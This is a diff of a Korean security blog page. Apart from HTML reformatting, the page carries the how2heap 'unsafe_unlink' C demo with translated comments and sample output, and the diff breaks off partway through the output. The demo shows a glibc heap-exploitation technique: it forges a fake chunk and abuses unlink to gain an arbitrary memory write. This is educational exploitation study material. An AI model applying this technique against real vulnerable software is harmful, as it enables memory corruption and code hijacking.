@@ -1,8 +1,8 @@
 <!DOCTYPE html>
 <html>
-<head><meta name="generator" content="Hexo 3.8.0">
-    <!-- hexo-inject:begin --><script src='https://unpkg.com/echarts@3.3.2/dist/echarts.min.js'></script><!-- hexo-inject:end --><meta charset="utf-8">
-	<meta name="naver-site-verification" content="e19266ac7916f4f7f8ebeef5355bdce5102d3416">
+<head>
+    <!-- hexo-inject:begin --><script src='https://unpkg.com/echarts@3.3.2/dist/echarts.min.js'></script><!-- hexo-inject:end --><meta charset="utf-8" />
+	<meta name="naver-site-verification" content="e19266ac7916f4f7f8ebeef5355bdce5102d3416"/>
 	<!-- Global site tag (gtag.js) - Google Analytics -->
 	<script async src="https://www.googletagmanager.com/gtag/js?id=UA-140827316-1"></script>
 	<script>
@@ -18,54 +18,72 @@
     
     <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
     
-        <meta name="keywords" content="Theory">
+        <meta name="keywords" content="Theory" />
     
-    <meta name="description" content="unsafe_unlink.c 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960#include &amp;lt;stdio.h&amp;gt;#include &amp;lt;stdlib.h&amp;gt;#include &amp;lt;string.h&amp;g">
-<meta name="keywords" content="Theory">
+    <meta name="description" content="unsafe_unlink.c 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;string.h&amp;g">
 <meta property="og:type" content="article">
 <meta property="og:title" content="[How2Heap] unsafe_unlink">
 <meta property="og:url" content="https://j0n9hyun.xyz/theory/How2Heap-unsafe-unlink-c/index.html">
 <meta property="og:site_name" content="j0n9hyun">
-<meta property="og:description" content="unsafe_unlink.c 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960#include &amp;lt;stdio.h&amp;gt;#include &amp;lt;stdlib.h&amp;gt;#include &amp;lt;string.h&amp;g">
-<meta property="og:locale" content="ko">
+<meta property="og:description" content="unsafe_unlink.c 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;string.h&amp;g">
+<meta property="og:locale" content="ko_KR">
 <meta property="og:image" content="https://user-images.githubusercontent.com/16969364/58533188-cb21ce00-8222-11e9-8f58-45c4f5c4657e.png">
-<meta property="og:updated_time" content="2019-05-29T07:18:16.000Z">
+<meta property="article:published_time" content="2019-05-29T05:50:05.000Z">
+<meta property="article:modified_time" content="2019-05-29T07:18:16.000Z">
+<meta property="article:author" content="j0n9hyun">
+<meta property="article:tag" content="Theory">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="[How2Heap] unsafe_unlink">
-<meta name="twitter:description" content="unsafe_unlink.c 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960#include &amp;lt;stdio.h&amp;gt;#include &amp;lt;stdlib.h&amp;gt;#include &amp;lt;string.h&amp;g">
 <meta name="twitter:image" content="https://user-images.githubusercontent.com/16969364/58533188-cb21ce00-8222-11e9-8f58-45c4f5c4657e.png">
     
-	<link rel="canonical" href="https://j0n9hyun.xyz/theory/how2heap-unsafe-unlink-c/">
+	<link rel="canonical" href="https://j0n9hyun.xyz/theory/how2heap-unsafe-unlink-c/"/>
 
     
 
     
-        <link rel="icon" href="https://ctf.j0n9hyun.xyz/files/fbf1004228885fb7ac783e1d540d4538/vector.ico">
+        <link rel="icon" href="https://ctf.j0n9hyun.xyz/files/fbf1004228885fb7ac783e1d540d4538/vector.ico" />
     
 
-    <link rel="stylesheet" href="/libs/font-awesome/css/font-awesome.min.css">
-    <link rel="stylesheet" href="/libs/titillium-web/styles.css">
-    <link rel="stylesheet" href="/libs/source-code-pro/styles.css">
+    
+<link rel="stylesheet" href="/libs/font-awesome/css/font-awesome.min.css">
 
-	<link rel="stylesheet" type="text/css" href>
-	<link rel="stylesheet" href="https://cdn.rawgit.com/innks/NanumSquareRound/master/nanumsquareround.css">	
-	<link rel="stylesheet" href="https://fonts.googleapis.com/earlyaccess/nanumgothiccoding.css">
-    <link rel="stylesheet" href="/css/style.css">
+    
+<link rel="stylesheet" href="/libs/titillium-web/styles.css">
 
-    <script src="/libs/jquery/3.3.1/jquery.min.js"></script>
     
-    
-        <link rel="stylesheet" href="/libs/lightgallery/css/lightgallery.min.css">
-    
-    
-        <link rel="stylesheet" href="/libs/justified-gallery/justifiedGallery.min.css"><!-- hexo-inject:begin --><!-- hexo-inject:end -->
-    
-    
-    
+<link rel="stylesheet" href="/libs/source-code-pro/styles.css">
 
 
-</head>
-</html>
+	<link rel="stylesheet" type="text/css" href="">
+	
+<link rel="stylesheet" href="https://cdn.rawgit.com/innks/NanumSquareRound/master/nanumsquareround.css">
+	
+	
+<link rel="stylesheet" href="https://fonts.googleapis.com/earlyaccess/nanumgothiccoding.css">
+
+    
+<link rel="stylesheet" href="/css/style.css">
+
+
+    
+<script src="/libs/jquery/3.3.1/jquery.min.js"></script>
+
+    
+    
+        
+<link rel="stylesheet" href="/libs/lightgallery/css/lightgallery.min.css">
+
+    
+    
+        
+<link rel="stylesheet" href="/libs/justified-gallery/justifiedGallery.min.css">
+
+    
+    
+    
+
+
+<meta name="generator" content="Hexo 5.0.2"><!-- hexo-inject:begin --><!-- hexo-inject:end --></head>
+
 <body>
     <!-- hexo-inject:begin --><!-- hexo-inject:end --><div id="wrap">
         <header id="header">
@@ -93,13 +111,13 @@
                     <div class="nav-container-inner">
                         <ul id="main-nav">
                             
-                                <li class="main-nav-list-item">
+                                <li class="main-nav-list-item" >
                                     <a class="main-nav-list-link" href="/">Home</a>
                                 </li>
                             
                                         <ul class="main-nav-list"><li class="main-nav-list-item"><a class="main-nav-list-link" href="/categories/Daily/">Daily</a></li><li class="main-nav-list-item"><a class="main-nav-list-link" href="/categories/Develop/">Develop</a></li><li class="main-nav-list-item"><a class="main-nav-list-link" href="/categories/Script/">Script</a></li><li class="main-nav-list-item"><a class="main-nav-list-link" href="/categories/Theory/">Theory</a></li><li class="main-nav-list-item"><a class="main-nav-list-link" href="/categories/WriteUps/">WriteUps</a><ul class="main-nav-list-child"><li class="main-nav-list-item"><a class="main-nav-list-link" href="/categories/WriteUps/Crypto/">Crypto</a></li><li class="main-nav-list-item"><a class="main-nav-list-link" href="/categories/WriteUps/Foren/">Foren</a></li><li class="main-nav-list-item"><a class="main-nav-list-link" href="/categories/WriteUps/Pwn/">Pwn</a></li><li class="main-nav-list-item"><a class="main-nav-list-link" href="/categories/WriteUps/Rev/">Rev</a></li><li class="main-nav-list-item"><a class="main-nav-list-link" href="/categories/WriteUps/Web/">Web</a></li><li class="main-nav-list-item"><a class="main-nav-list-link" href="/categories/WriteUps/misc/">misc</a></li></ul></li></ul>
                                     
-                                <li class="main-nav-list-item">
+                                <li class="main-nav-list-item" >
                                     <a class="main-nav-list-link" href="/about">About</a>
                                 </li>
                             
@@ -108,14 +126,14 @@
                             <div id="search-form-wrap">
 
     <form class="search-form">
-        <input type="text" class="ins-search-input search-form-input" placeholder="검색">
+        <input type="text" class="ins-search-input search-form-input" placeholder="검색" />
         <button type="submit" class="search-form-submit"></button>
     </form>
     <div class="ins-search">
     <div class="ins-search-mask"></div>
     <div class="ins-search-container">
         <div class="ins-input-wrapper">
-            <input type="text" class="ins-search-input" placeholder="입력">
+            <input type="text" class="ins-search-input" placeholder="입력" />
             <span class="ins-close ins-selectable"><i class="fa fa-times-circle"></i></span>
         </div>
         <div class="ins-section-wrapper">
@@ -139,7 +157,9 @@
     window.INSIGHT_CONFIG = INSIGHT_CONFIG;
 })(window);
 </script>
+
 <script src="/js/insight.js"></script>
+
 
 </div>
                         </nav>
@@ -189,7 +209,7 @@
                 
     <div class="article-tag">
         <i class="fa fa-tag"></i>
-        <a class="tag-link" href="/tags/Theory/">Theory</a>
+        <a class="tag-link-link" href="/tags/Theory/" rel="tag">Theory</a>
     </div>
 
   			<span class="reading-time">⏱ 7 분</span>
@@ -198,39 +218,39 @@
         
         <div class="article-entry" itemprop="articleBody">
             <link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/hint.css/2.4.1/hint.min.css"><h3 id="unsafe_unlinkc"><a class="markdownIt-Anchor" href="#unsafe_unlinkc"></a> unsafe_unlink.c</h3>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">uint64_t</span> *chunk0_ptr;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"unsafe unlink 2.0!\n"</span>);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"테스트 환경: Ubuntu 14.04/16.04 64bit\n"</span>);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"이 기법은 unlink를 호출할 수 있는 알려진 위치에 포인터가 있을 때 사용할 수 있다.\n"</span>);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"대부분의 시나리오는 overflow를 할 수 있고 전역 포인터를 가지고 있는 취약한 버퍼다.\n"</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> malloc_size = <span class="number">0x80</span>; <span class="comment">// 우리는 fastbin을 사용하지 않을 정도로 커지고 싶다.</span></span><br><span class="line"><span class="keyword">int</span> header_size = <span class="number">2</span>;</span><br><span class="line"></span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"이번 연습의 요점은 임의의 메모리를 쓰기 위해 free를 사용하여 global chunk0_ptr을 corrupt시키는 것이다.\n\n"</span>);</span><br><span class="line"></span><br><span class="line">chunk0_ptr = (<span class="keyword">uint64_t</span>*) <span class="built_in">malloc</span>(malloc_size); <span class="comment">//chunk0</span></span><br><span class="line"><span class="keyword">uint64_t</span> *chunk1_ptr  = (<span class="keyword">uint64_t</span>*) <span class="built_in">malloc</span>(malloc_size); <span class="comment">//chunk1</span></span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"global chunk0_ptr: %p, pointing to %p\n"</span>, &amp;chunk0_ptr, chunk0_ptr);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"corrupt할 victim chunk: %p\n\n"</span>, chunk1_ptr);</span><br><span class="line"></span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"chunk0에 fake chunk를 생성한다.\n"</span>);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"&amp;chunk0_ptr 근처를 가리키도록 fake chunk의 next_free_chunk(fd)를 설정하여 P-&gt;fd-&gt;bk=P가 되게 한다.\n"</span>);</span><br><span class="line">chunk0_ptr[<span class="number">2</span>] = (<span class="keyword">uint64_t</span>) &amp;chunk0_ptr-(<span class="keyword">sizeof</span>(<span class="keyword">uint64_t</span>)*<span class="number">3</span>);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"&amp;chunk0_ptr 근처를 가리키도록 fake chunk의 previous_free_chunk(bk)를 설정하여 P-&gt;bk-&gt;fd=P가 되게 한다.\n"</span>);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"이 설정을 통해서 우리는 체크를 통과할 수 있다: : (P-&gt;fd-&gt;bk != P || P-&gt;bk-&gt;fd != P) == False\n"</span>);</span><br><span class="line">chunk0_ptr[<span class="number">3</span>] = (<span class="keyword">uint64_t</span>) &amp;chunk0_ptr-(<span class="keyword">sizeof</span>(<span class="keyword">uint64_t</span>)*<span class="number">2</span>);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Fake chunk fd: %p\n"</span>,(<span class="keyword">void</span>*) chunk0_ptr[<span class="number">2</span>]);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Fake chunk bk: %p\n\n"</span>,(<span class="keyword">void</span>*) chunk0_ptr[<span class="number">3</span>]);</span><br><span class="line"></span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"chunk0에 overflow가 발생한다고 가정한다면 우리는 chunk1의 metadata를 자유롭게 바꿀 수 있다.\n"</span>);</span><br><span class="line"><span class="keyword">uint64_t</span> *chunk1_hdr = chunk1_ptr - header_size;</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"chunk0의 크기를 줄여서(chunk1에 previous_size가 저장된) free가 chunk0이 fake chunk에 위치한 곳에서 시작한다고 생각할 것이다.\n"</span>);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"fake chunk가 정확히 알려진 포인터가 가리키는 곳에서 시작되고 그에 따라 chunk를 축소하는 것이 중요하다.\n"</span>);</span><br><span class="line">chunk1_hdr[<span class="number">0</span>] = malloc_size;</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"만약 우리가 일반적으로 free된 chunk0이 있다고 하면, chunk1.previous_size는 0x90이 될 것이다.\n"</span></span><br><span class="line"><span class="string">"그러나 이것은 새로운 값이다: %p\n"</span>,(<span class="keyword">void</span>*)chunk1_hdr[<span class="number">0</span>]);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"chunk1의 previous_in_use를 false로 설정하여 free로 fake chunk를 표시한다.\n\n"</span>);</span><br><span class="line">chunk1_hdr[<span class="number">1</span>] &amp;= ~<span class="number">1</span>;</span><br><span class="line"></span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"이제 chunk1을 free해서 backward로 consolidate하면 fake chunk와 unlink될 것이고 chunk0_ptr을 overwrite한다\n"</span>);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"unlink 매크로 소스는 해당 링크에서 찾을 수 있다.\n"</span></span><br><span class="line"><span class="string">"https://sourceware.org/git/?p=glibc.git;a=blob;f=malloc/malloc.c;h=ef04360b918bceca424482c6db03cc5ec90c3e00;hb=07c18a008c2ed8f5660adba2b778671db159a141#l1344\n\n"</span>);</span><br><span class="line"><span class="built_in">free</span>(chunk1_ptr);</span><br><span class="line"></span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"이 때, 우리는 chunk0_ptr을 임의의 위치를 가리키도록 overwrite해서 사용할 수 있다.\n"</span>);</span><br><span class="line"><span class="keyword">char</span> victim_string[<span class="number">8</span>];</span><br><span class="line"><span class="built_in">strcpy</span>(victim_string,<span class="string">"Hello!~"</span>);</span><br><span class="line">chunk0_ptr[<span class="number">3</span>] = (<span class="keyword">uint64_t</span>) victim_string;</span><br><span class="line"></span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"chunk0_ptr은 이제 우리가 원하는 곳을 가리키고 있다. 이것은 victim문자열을 overwrite하는데 사용한다.\n"</span>);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"원래 값: %s\n"</span>,victim_string);</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">"-------chunk0_ptr[0]=0x4141414142424242LL-------"</span>);</span><br><span class="line">chunk0_ptr[<span class="number">0</span>] = <span class="number">0x4141414142424242</span>LL;</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"바뀐 값: %s\n"</span>,victim_string);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">uint64_t</span> *chunk0_ptr;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;unsafe unlink 2.0!\n&quot;</span>);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;테스트 환경: Ubuntu 14.04/16.04 64bit\n&quot;</span>);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;이 기법은 unlink를 호출할 수 있는 알려진 위치에 포인터가 있을 때 사용할 수 있다.\n&quot;</span>);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;대부분의 시나리오는 overflow를 할 수 있고 전역 포인터를 가지고 있는 취약한 버퍼다.\n&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> malloc_size = <span class="number">0x80</span>; <span class="comment">// 우리는 fastbin을 사용하지 않을 정도로 커지고 싶다.</span></span><br><span class="line"><span class="keyword">int</span> header_size = <span class="number">2</span>;</span><br><span class="line"></span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;이번 연습의 요점은 임의의 메모리를 쓰기 위해 free를 사용하여 global chunk0_ptr을 corrupt시키는 것이다.\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">chunk0_ptr = (<span class="keyword">uint64_t</span>*) <span class="built_in">malloc</span>(malloc_size); <span class="comment">//chunk0</span></span><br><span class="line"><span class="keyword">uint64_t</span> *chunk1_ptr  = (<span class="keyword">uint64_t</span>*) <span class="built_in">malloc</span>(malloc_size); <span class="comment">//chunk1</span></span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;global chunk0_ptr: %p, pointing to %p\n&quot;</span>, &amp;chunk0_ptr, chunk0_ptr);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;corrupt할 victim chunk: %p\n\n&quot;</span>, chunk1_ptr);</span><br><span class="line"></span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;chunk0에 fake chunk를 생성한다.\n&quot;</span>);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;&amp;chunk0_ptr 근처를 가리키도록 fake chunk의 next_free_chunk(fd)를 설정하여 P-&gt;fd-&gt;bk=P가 되게 한다.\n&quot;</span>);</span><br><span class="line">chunk0_ptr[<span class="number">2</span>] = (<span class="keyword">uint64_t</span>) &amp;chunk0_ptr-(<span class="keyword">sizeof</span>(<span class="keyword">uint64_t</span>)*<span class="number">3</span>);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;&amp;chunk0_ptr 근처를 가리키도록 fake chunk의 previous_free_chunk(bk)를 설정하여 P-&gt;bk-&gt;fd=P가 되게 한다.\n&quot;</span>);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;이 설정을 통해서 우리는 체크를 통과할 수 있다: : (P-&gt;fd-&gt;bk != P || P-&gt;bk-&gt;fd != P) == False\n&quot;</span>);</span><br><span class="line">chunk0_ptr[<span class="number">3</span>] = (<span class="keyword">uint64_t</span>) &amp;chunk0_ptr-(<span class="keyword">sizeof</span>(<span class="keyword">uint64_t</span>)*<span class="number">2</span>);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Fake chunk fd: %p\n&quot;</span>,(<span class="keyword">void</span>*) chunk0_ptr[<span class="number">2</span>]);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Fake chunk bk: %p\n\n&quot;</span>,(<span class="keyword">void</span>*) chunk0_ptr[<span class="number">3</span>]);</span><br><span class="line"></span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;chunk0에 overflow가 발생한다고 가정한다면 우리는 chunk1의 metadata를 자유롭게 바꿀 수 있다.\n&quot;</span>);</span><br><span class="line"><span class="keyword">uint64_t</span> *chunk1_hdr = chunk1_ptr - header_size;</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;chunk0의 크기를 줄여서(chunk1에 previous_size가 저장된) free가 chunk0이 fake chunk에 위치한 곳에서 시작한다고 생각할 것이다.\n&quot;</span>);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;fake chunk가 정확히 알려진 포인터가 가리키는 곳에서 시작되고 그에 따라 chunk를 축소하는 것이 중요하다.\n&quot;</span>);</span><br><span class="line">chunk1_hdr[<span class="number">0</span>] = malloc_size;</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;만약 우리가 일반적으로 free된 chunk0이 있다고 하면, chunk1.previous_size는 0x90이 될 것이다.\n&quot;</span></span><br><span class="line"><span class="string">&quot;그러나 이것은 새로운 값이다: %p\n&quot;</span>,(<span class="keyword">void</span>*)chunk1_hdr[<span class="number">0</span>]);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;chunk1의 previous_in_use를 false로 설정하여 free로 fake chunk를 표시한다.\n\n&quot;</span>);</span><br><span class="line">chunk1_hdr[<span class="number">1</span>] &amp;= ~<span class="number">1</span>;</span><br><span class="line"></span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;이제 chunk1을 free해서 backward로 consolidate하면 fake chunk와 unlink될 것이고 chunk0_ptr을 overwrite한다\n&quot;</span>);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;unlink 매크로 소스는 해당 링크에서 찾을 수 있다.\n&quot;</span></span><br><span class="line"><span class="string">&quot;https://sourceware.org/git/?p=glibc.git;a=blob;f=malloc/malloc.c;h=ef04360b918bceca424482c6db03cc5ec90c3e00;hb=07c18a008c2ed8f5660adba2b778671db159a141#l1344\n\n&quot;</span>);</span><br><span class="line"><span class="built_in">free</span>(chunk1_ptr);</span><br><span class="line"></span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;이 때, 우리는 chunk0_ptr을 임의의 위치를 가리키도록 overwrite해서 사용할 수 있다.\n&quot;</span>);</span><br><span class="line"><span class="keyword">char</span> victim_string[<span class="number">8</span>];</span><br><span class="line"><span class="built_in">strcpy</span>(victim_string,<span class="string">&quot;Hello!~&quot;</span>);</span><br><span class="line">chunk0_ptr[<span class="number">3</span>] = (<span class="keyword">uint64_t</span>) victim_string;</span><br><span class="line"></span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;chunk0_ptr은 이제 우리가 원하는 곳을 가리키고 있다. 이것은 victim문자열을 overwrite하는데 사용한다.\n&quot;</span>);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;원래 값: %s\n&quot;</span>,victim_string);</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;-------chunk0_ptr[0]=0x4141414142424242LL-------&quot;</span>);</span><br><span class="line">chunk0_ptr[<span class="number">0</span>] = <span class="number">0x4141414142424242</span>LL;</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;바뀐 값: %s\n&quot;</span>,victim_string);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 <center><small>[unsafe_unlink.c]</small></center>
-<p><img src="https://user-images.githubusercontent.com/16969364/58533188-cb21ce00-8222-11e9-8f58-45c4f5c4657e.png" alt><br>
-<img src="https://user-images.githubusercontent.com/16969364/58533397-5ac77c80-8223-11e9-923e-14828d385b91.PNG" alt><br>
-<img src="https://user-images.githubusercontent.com/16969364/58533399-5b601300-8223-11e9-97f1-676a43e00fdd.PNG" alt></p>
-<p><code>unsafe unlink 2.0!</code><br>
-<code>테스트 환경: Ubuntu 14.04/16.04 64bit</code><br>
-이 기법은 unlink를 호출할 수 있는 알려진 위치에 포인터가 있을 때 사용할 수 있다.<br>
-대부분의 시나리오는 overflow를 할 수 있고 전역 포인터를 가지고 있는 취약한 버퍼다.<br>
+<p><img src="https://user-images.githubusercontent.com/16969364/58533188-cb21ce00-8222-11e9-8f58-45c4f5c4657e.png" alt="" /><br />
+<img src="https://user-images.githubusercontent.com/16969364/58533397-5ac77c80-8223-11e9-923e-14828d385b91.PNG" alt="" /><br />
+<img src="https://user-images.githubusercontent.com/16969364/58533399-5b601300-8223-11e9-97f1-676a43e00fdd.PNG" alt="" /></p>
+<p><code>unsafe unlink 2.0!</code><br />
+<code>테스트 환경: Ubuntu 14.04/16.04 64bit</code><br />
+이 기법은 unlink를 호출할 수 있는 알려진 위치에 포인터가 있을 때 사용할 수 있다.<br />
+대부분의 시나리오는 overflow를 할 수 있고 전역 포인터를 가지고 있는 취약한 버퍼다.<br />
 이번 연습의 요점은 임의의 메모리를 쓰기 위해 free를 사용하여 global chunk0_ptr을 corrupt시키는 것이다.</p>
-<p><code>global chunk0_ptr: 0x602070, pointing to 0x603010</code><br>
+<p><code>global chunk0_ptr: 0x602070, pointing to 0x603010</code><br />
 <code>corrupt할 victim chunk: 0x6030a0</code></p>
-<p>chunk0에 fake chunk를 생성한다.<br>
-&amp;chunk0_ptr 근처를 가리키도록 fake chunk의 next_free_chunk(fd)를 설정하여 P-&gt;fd-&gt;bk=P가 되게 한다.<br>
-&amp;chunk0_ptr 근처를 가리키도록 fake chunk의 previous_free_chunk(bk)를 설정하여 P-&gt;bk-&gt;fd=P가 되게 한다.<br>
-이 설정을 통해서 우리는 체크를 통과할 수 있다: : (P-&gt;fd-&gt;bk != P || P-&gt;bk-&gt;fd != P) == False<br>
-<code>Fake chunk fd: 0x602058</code><br>
+<p>chunk0에 fake chunk를 생성한다.<br />
